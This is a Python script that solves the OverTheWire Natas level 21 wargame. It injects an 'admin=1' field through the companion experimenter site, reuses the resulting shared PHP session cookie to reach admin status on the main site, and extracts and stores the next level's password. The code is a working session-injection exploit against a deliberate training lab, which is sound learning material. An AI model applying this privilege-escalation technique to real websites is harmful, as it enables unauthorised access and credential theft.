import requests,re,base64,natas

B64 = 'Basic %s' % base64.b64encode( '%s:%s' % ('natas21',natas.get_credential('natas21')))
URL = 'http://natas21.natas.labs.overthewire.org/index.php?debug'
CO_URL='http://natas21-experimenter.natas.labs.overthewire.org/index.php'

def main():
    cookie = inject()
    print('cookie: %s' % cookie)
    response = requests.get(
            URL,
            headers=dict(Authorization=B64),
            cookies=dict(PHPSESSID=cookie)
    )

    regex = r"Password: (\w+)"
    matches = re.finditer(regex,response.content,re.MULTILINE)

    for match in matches:
        print('found password: %s' % match.group(1))
        print('adding to credentials....')
        natas.save_credentials('natas22',match.group(1))
        print('done')
        break



def inject():
    cookie = requests.post(
        CO_URL,
        headers=dict(Authorization=B64),
        data={
            'align':'center',
            'fontsize':'100%',
            'bgcolor':'yelow',
            'admin':'1',
            'submit':'Update'
        }
    ).cookies['PHPSESSID']
    return cookie

if __name__ == '__main__':
    main()
